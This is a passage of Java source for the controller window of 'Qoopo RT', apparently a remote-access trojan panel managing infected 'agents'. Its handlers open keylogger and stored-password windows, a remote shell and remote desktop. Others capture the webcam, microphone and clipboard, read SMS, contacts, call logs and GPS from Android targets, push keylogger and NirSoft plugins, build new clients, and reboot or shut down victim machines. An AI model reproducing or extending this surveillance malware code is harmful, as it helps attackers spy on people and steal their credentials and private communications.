                        this.getVistaPrevia().setIcon(new ImageIcon(server.getVistaPreviaWC().getImage().getScaledInstance(this.getVistaPrevia().getWidth(), this.getVistaPrevia().getHeight(), Image.SCALE_SMOOTH)));
                    }
                } else if (this.getChkVistaPrevia().isSelected()) {
                    this.getVistaPrevia().setIcon(server.getVistaPreviaEscritorio());
                } else {
                    this.getVistaPrevia().setIcon(server.getVistaPreviaWC());
                }
            } else {
                this.getVistaPrevia().setIcon(null);
            }
        } catch (Exception e) {
        }
    }

    public void tablaMouseClicked(MouseEvent evt) {
        serverSeleccionado = equipos.getSeleccionado();
        Asociado tmp = QoopoRT.SERVIDORES.get(serverSeleccionado);
        if (tmp == null) {            //si no hay un servidor lo elimino de la tabla
            return;
        }
        if (this.getChkVistaPrevia().isSelected()) {
            tmp.pedirPantallaMiniatura();
        }
//        if (this.getChkVistaPrevia()WC.isSelected()) {
//            if (this.getChkVistaPrevia()WCAndroid.isSelected()) {
//                if (tmp.isAndroid()) {
//                    tmp.pedirWebCamMiniatura();
//                }
//            } else {
//                tmp.pedirWebCamMiniatura();
//            }
//        }
        mostrarMiniatura(tmp);
        if (evt.getClickCount() == 2) {
            tmp.abrirEscritorioRemoto();//abre la función escritorio remoto
            //new ContenedorGUI(tmp).setVisible(true); // abre una ventana que contendra las funciones del servidor
//        java.awt.EventQueue.invokeLater(new Runnable() {
//            public void run() {
//                new ContenedorGUI(tmp).setVisible(true);
//            }
//        });
        }
    }

    public void tablaMousePressed(MouseEvent evt) {

    }

    public PanelEquipos getEquipos() {
        return equipos;
    }

    public void setEquipos(PanelEquipos equipos) {
        this.equipos = equipos;
    }

    public JCheckBox getChkGuardarMiniaturas() {
        return chkGuardarMiniaturas;
    }

    public void setChkGuardarMiniaturas(JCheckBox chkGuardarMiniaturas) {
        this.chkGuardarMiniaturas = chkGuardarMiniaturas;
    }

    /**
     * Abre una ventana del keylogger sin tener un asociado para poder abrir
     * archivos ya capturados y procesarlos
     *
     * @param evt
     */
    public void abrirKeyloggerVisor(ActionEvent evt) {
        KeyLogger ven = new KeyLogger(null);
        ven.setVisible(true);
        GuiUtil.centrarVentana(ven);
        ven.setTitle("KeyLogger [Visor]");       

    }

    public void abrirKeylogger(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            KeyLogger ven = (KeyLogger) tmp.getKeylogger();
            if (ven == null) {
                ven = new KeyLogger(tmp);
                ven.setVisible(true);
                GuiUtil.centrarVentana(ven);
                ven.setTitle("KeyLogger [" + tmp.getInformacion() + "]");
                tmp.setKeylogger(ven);
            } else {
                if (!ven.isVisible()) {
                    ven.setVisible(true);
                }
                ven.setTitle("KeyLogger [" + tmp.getInformacion() + "]");
            }
        }
    }

    public void infoAP(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.abrirVentanaInformacion();

        }
    }

    public void cargaSistemaAP(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.abrirVentanaMonitorAsociado();
        }
    }

    public void portapapelesAP(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.abrirVentanaPortapapeles();
        }
    }

    public void textSpeakAP(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            TextoSpeak ven = (TextoSpeak) tmp.getVenTextoSpeak();
            if (ven == null) {
                ven = new TextoSpeak(tmp);
                ven.setVisible(true);
                ven.setTitle("Texto Speak[" + tmp.getInformacion() + "]");
                tmp.setVenTextoSpeak(ven);
            } else {
                if (!ven.isVisible()) {
                    ven.setVisible(true);
                }
                ven.setTitle("Texto Speak[" + tmp.getInformacion() + "]");
            }
        }
    }

    public void enviarMensajeAP(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            Mensajes ven = (Mensajes) tmp.getVenMensaje();
            if (ven == null) {
                ven = new Mensajes(tmp);
                ven.setVisible(true);
                ven.setTitle("Mensaje[" + tmp.getInformacion() + "]");
                tmp.setVenMensaje(ven);
            } else {
                if (!ven.isVisible()) {
                    ven.setVisible(true);
                }
                ven.setTitle("Mensaje[" + tmp.getInformacion() + "]");
            }

        }
    }

    public void consolaAP(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            Terminal ven = (Terminal) tmp.getConsola();
            if (ven == null) {
                ven = new Terminal(tmp);
                ven.setVisible(true);
                GuiUtil.centrarVentana(ven, 600, 350);
                ven.setTitle("Shell remota [" + tmp.getInformacion() + "]");
                tmp.setConsola(ven);
                tmp.activarComandoConsola();
            } else {
                if (!ven.isVisible()) {
                    ven.setVisible(true);
                }
                ven.setTitle("Shell remota [" + tmp.getInformacion() + "]");
            }
        }
    }

    public void abrirCarpeta(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            try {
                Desktop.getDesktop().open(tmp.getdPrincipal().getAbsoluteFile());
            } catch (Exception ex) {
            }
        }
    }

    public void chatAP(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.abrirVentanaChat();
        }
    }

    public void procesosAP(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.abrirVentanaProcesos();
        }
    }

    public void conexionesAP(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.abrirVentanaConexiones();
        }
    }

    public void redlanAP(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            RedLan ven = (RedLan) tmp.getRedLan();
            if (ven == null) {
                ven = new RedLan(tmp);
                ven.setVisible(true);
                GuiUtil.centrarVentana(ven);
                ven.setTitle("Equipos Red Lan [" + tmp.getInformacion() + "]");
                tmp.setRedLan(ven);
            } else {
                if (!ven.isVisible()) {
                    ven.setVisible(true);
                }
                ven.setTitle("Equipos Red Lan [" + tmp.getInformacion() + "]");
            }
        }
    }

    public void escritorioRemotoAP(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.abrirEscritorioRemoto();
        }
    }

    public void btnCrearServidorActionPerformed(ActionEvent evt) {
        CrearCliente ven = new CrearCliente();
        ven.setVisible(true);
    }

    public void capturarMicrofonoPerformed(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.abrirVoIP();
        }
    }

    public void abrirGPSActionPerformed(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            Mapa ven = (Mapa) tmp.getMapa();
            if (ven == null) {
                ven = new Mapa(null, tmp);
                new Thread(ven).start();
                ven.setVisible(true);
                GuiUtil.centrarVentana(ven);
                tmp.setMapa(ven);
            } else if (!ven.isVisible()) {
                ven.setVisible(true);
            }
        }
    }

    public void abrirContactosActionPerformed(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            Contactos ven = (Contactos) tmp.getContactos();
            if (ven == null) {
                ven = new Contactos(tmp);
                ven.setVisible(true);
                GuiUtil.centrarVentana(ven);
                tmp.setContactos(ven);
            } else if (!ven.isVisible()) {
                ven.setVisible(true);
            }
        }
    }

    public void abrirSMSActionPerformed(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            SMSListar ven = (SMSListar) tmp.getSmsListar();
            if (ven == null) {
                ven = new SMSListar(tmp);
                ven.setVisible(true);
                GuiUtil.centrarVentana(ven);
                tmp.setSmsListar(ven);
            } else if (!ven.isVisible()) {
                ven.setVisible(true);
            }
        }
    }

    public void abrirLlamadasActionPerformed(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            Llamadas ven = (Llamadas) tmp.getLlamadas();
            if (ven == null) {
                ven = new Llamadas(tmp);
                ven.setVisible(true);
                GuiUtil.centrarVentana(ven);
                tmp.setLlamadas(ven);
            } else if (!ven.isVisible()) {
                ven.setVisible(true);
            }
        }
    }

    public void camaraAP(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.abrirVentanaCamara();
        }
    }

    public void reiniciarServidor(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.reiniciar();
        }
    }

    public void apagarServidor(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.apagar();
        }
    }

    public void reiniciarEquipo(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.reiniciarEquipo();
        }
    }

    public void apagarEquipo(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.apagarEquipo();
        }
    }

    public void verPluginsAP(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.abrirVentanaPlugins();
        }
    }

    public void enviarPluginsWebCam(ActionEvent evt) {
        try {
            Global.extraerPlugInsWebCam();
        } catch (Exception ex) {
        }
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.enviarPluginsWebCam();
        }
    }

    public void enviarPluginsJNA(ActionEvent evt) {
        try {
            Global.extraerPlugInsJNA();
        } catch (Exception ex) {
        }
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.enviarPluginsJNA();
        }
    }

    public void enviarPluginsKL(ActionEvent evt) {
        try {
            Global.extraerPlugInsKL();
        } catch (Exception ex) {
        }
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.enviarPluginsKL();
        }
    }

    public void enviarPluginsNirSoft(ActionEvent evt) {
        try {
            Global.extrarPlugInsNirSoft();
        } catch (Exception ex) {
        }
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.enviarPluginsNirSoft();
        }
    }

    public void hacerPing(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.hacerPing();
        }
    }

    public void abrirURL(ActionEvent evt) {
        String url = null;
        JPanel pnlURL = new JPanel();
        pnlURL.setLayout(new BorderLayout());
        JTextField txtUrl = new JTextField("http://");
        pnlURL.add(GuiUtil.crearJLabel("Abrir web:"), BorderLayout.CENTER);
        pnlURL.add(txtUrl, BorderLayout.SOUTH);
        int action = JOptionPane.showConfirmDialog(null, pnlURL, "Abrir Url", JOptionPane.OK_CANCEL_OPTION, JOptionPane.WARNING_MESSAGE, Util.cargarIcono32("/resources/browser.png"));
        if (action != JOptionPane.OK_OPTION) {
            return;
        } else {
            url = txtUrl.getText();
        }

        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.abrirURL(url);
        }
    }

    public void buscarIp(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            Mapa ven = (Mapa) tmp.getMapa();
            if (ven == null) {
                ven = new Mapa(null, tmp);
                new Thread(ven).start();
                ven.setVisible(true);
                GuiUtil.centrarVentana(ven);
                ven.getTxtIp().setText(tmp.getIp());
                ven.buscar();
                tmp.setMapa(ven);
            } else if (!ven.isVisible()) {
                ven.setVisible(true);
                ven.getTxtIp().setText(tmp.getIp());
                ven.buscar();
            }
        }
    }

    public void archivosOffline(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            ArchivosOffline ven = tmp.getArchivosOffline();
            if (ven == null) {
                ven = new ArchivosOffline(tmp);
                ven.setVisible(true);
                GuiUtil.centrarVentana(ven);
                tmp.setArchivosOffline(ven);
            } else if (!ven.isVisible()) {
                ven.setVisible(true);
            }
        }
    }

    public void archivosOfflineVisor(ActionEvent evt) {
        this.abrirArchivosOfflineVisor(null);
    }

    public void abrirArchivosOfflineVisor(File archivo) {
        ReproductorCapturas ven = new ReproductorCapturas(false);
        ven.setVisible(true);
        GuiUtil.centrarVentana(ven);
        if (archivo != null) {
            ven.cargarArchivo(archivo);
        }
    }

    public void abrirPasswords(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            Passwords ven = (Passwords) tmp.getPasswords();
            if (ven == null) {
                ven = new Passwords(tmp);
                ven.setVisible(true);
                GuiUtil.centrarVentana(ven);
                ven.setTitle("Contraseñas [" + tmp.getInformacion() + "]");
                tmp.setPasswords(ven);
            } else {
                if (!ven.isVisible()) {
                    ven.setVisible(true);
                }
                ven.setTitle("Contraseñas [" + tmp.getInformacion() + "]");
            }
        }
    }

    public void desinstalarAgente(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.desinstalarServidor();
        }
    }

    public void actualizarServidorAutomatico(ActionEvent evt) {
        if (!new File(this.pnlConfiguracion.getTxtRutaArchivo().getText()).exists()) {
            cliente.ponerEstado("El servidor configurado no existe. Se debe escoger manualmente uno.");
            JFileChooser cd = new JFileChooser();
            cd.setFileSelectionMode(JFileChooser.FILES_ONLY);
            cd.setMultiSelectionEnabled(false);
            if (cd.showOpenDialog(null) == 0) {
                File servidor = cd.getSelectedFile();
                String archivo = servidor.getAbsolutePath();
                for (String seleccionado : this.getEquipos().getSeleccionados()) {
                    Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
                    tmp.crearCarpeta("a", "<server>/../");
                    tmp.actualizarServidor(archivo, "<server>/../a");
//                    tmp.actualizarServidor(archivo, "<tmp>");
                }
            }
        } else {
            for (String seleccionado : this.getEquipos().getSeleccionados()) {
                Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
                tmp.crearCarpeta("a", "<server>/../");
                tmp.actualizarServidor(this.pnlConfiguracion.getTxtRutaArchivo().getText(), "<server>/../a");
//                tmp.actualizarServidor(this.getTxtRutaArchivo().getText(), "<tmp>");
            }
        }
    }

    public void actualizarServidor(ActionEvent evt) {

        JFileChooser cd = new JFileChooser();
        cd.setFileSelectionMode(JFileChooser.FILES_ONLY);
        cd.setMultiSelectionEnabled(false);

        File temp = new File(this.pnlConfiguracion.getTxtRutaArchivo().getText());
        if (temp.exists()) {
            cd.setCurrentDirectory(temp.getParentFile());
            cd.setSelectedFile(temp);
        }

        if (cd.showOpenDialog(null) == 0) {
            File servidor = cd.getSelectedFile();
            String archivo = servidor.getAbsolutePath();
            for (String seleccionado : this.getEquipos().getSeleccionados()) {
                Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
                tmp.crearCarpeta("a", "<server>/../");
                tmp.actualizarServidor(archivo, "<server>/../a");
//                tmp.actualizarServidor(archivo, "<tmp>");
            }
        }
    }

    public void administrarArchivosActionPerformed(ActionEvent evt) {
        for (String seleccionado : this.getEquipos().getSeleccionados()) {
            Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
            tmp.abrirAdminArchivos();
        }
    }

    public void eliminarAgente(Asociado agente, boolean yaEliminadoDeLista) {
        try {
            Camara wC = agente.getCamara();
            EscritorioRemoto eR = agente.getEscritorioRemoto();
            AdminArchivos aA = agente.getAdminArchivos();
            VoIp mic = agente.getVopIp();
            Passwords pass = agente.getPasswords();
            Mapa mapa = agente.getMapa();
            Contactos contacto = agente.getContactos();
            SMSListar smsListar = agente.getSmsListar();
            Informacion info = agente.getInformacionGUI();
            Portapapeles clipboard = agente.getPortapapeles();
            Procesos procesosVentana = agente.getProcesos();
            Conexiones conexionesVentana = agente.getConexiones();
            Chat vChat = agente.getChat();
            ArchivosOffline venOffline = agente.getArchivosOffline();
            Terminal vCOnsola = agente.getConsola();
            KeyLogger venKeylogger = agente.getKeylogger();
            RedLan vRedLan = agente.getRedLan();
            Mensajes vMensaje = agente.getVenMensaje();
            TextoSpeak vTextoSpeak = agente.getVenTextoSpeak();
            MonitorSistemaAsociado vMonitor = agente.getMonitorSistema();
            Plugins vPlugins = agente.getPlugins();

            try {
                vPlugins.dispose();
            } catch (Exception e) {
            }

            try {
                vMonitor.dispose();
            } catch (Exception e) {
            }

            try {
                vTextoSpeak.dispose();
            } catch (Exception e) {
            }
            try {
                vMensaje.dispose();
            } catch (Exception e) {
            }

            try {
                vCOnsola.dispose();
            } catch (Exception e) {
            }

            try {
                vRedLan.dispose();
            } catch (Exception e) {
            }
            try {
                venKeylogger.dispose();
            } catch (Exception e) {
            }
            try {
                venOffline.dispose();
            } catch (Exception e) {
            }
            try {
                wC.dispose();
            } catch (Exception e) {
            }
            try {
                eR.detenerTodo();
                eR.dispose();
            } catch (Exception e) {
            }
            try {
                aA.dispose();
            } catch (Exception e) {
            }
            try {
                mic.dispose();
            } catch (Exception e) {
            }
            try {
                pass.dispose();
            } catch (Exception e) {
            }
            try {
                mapa.dispose();
            } catch (Exception e) {
            }
            try {
                contacto.dispose();
            } catch (Exception e) {
            }
            try {
                smsListar.dispose();
            } catch (Exception e) {
            }
            try {
                info.dispose();
            } catch (Exception e) {
            }
            try {
                clipboard.dispose();
            } catch (Exception e) {
            }
            try {
                procesosVentana.dispose();
            } catch (Exception e) {
            }
            try {
                conexionesVentana.dispose();
            } catch (Exception e) {
            }
            try {
                vChat.dispose();
            } catch (Exception e) {
            }

//        QoopoRT.capturasEscritorio.remove(serv.getIdentificador());
            agente.setEscritorioRemoto(null);

            try {
                if (this.getServerSeleccionado().equals(agente.getIdentificador())) {
                    this.mostrarMiniatura(null);
                }
            } catch (Exception e) {
            }

            //if (ventana != null) {
            getEquipos().eliminarServidor(agente);
            //}
            if (!yaEliminadoDeLista) {
                QoopoRT.SERVIDORES.remove(agente.getIdentificador());
            }

            //if (ventana != null) {
            setTitle("Qoopo RT (Remote Tools) [" + QoopoRT.SERVIDORES.size() + " equipos conectados]");
            //}
            agente.interrupt();
            agente = null;
            System.gc();

        } catch (Exception e) {
        }
    }

    static class CeldaIcono extends DefaultTableCellRenderer {

        @Override
        public void setValue(Object value) {
            try {
                setIcon(Util.cargarIcono16("/resources/username.png"));
            } catch (Exception e) {
            }
        }
    }

}
